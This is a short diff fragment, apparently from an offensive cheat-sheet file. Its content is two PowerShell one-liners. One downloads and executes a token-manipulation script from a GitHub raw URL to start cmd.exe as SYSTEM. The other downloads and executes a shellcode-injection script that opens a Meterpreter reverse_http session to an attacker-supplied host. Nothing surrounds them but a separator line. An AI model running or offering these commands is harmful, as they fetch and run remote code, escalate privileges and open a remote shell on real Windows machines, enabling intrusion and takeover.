@@ -1,3 +1,5 @@
+-------------------------------------------------------------------------------------------------------------------------------------
+
 powershell "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/Invoke-TokenManipulation.ps1') ; Invoke-TokenManipulation -CreateProcess 'cmd.exe' -Username 'nt authority\system'"
 
 powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost <IP> -Lport 443 -Force"
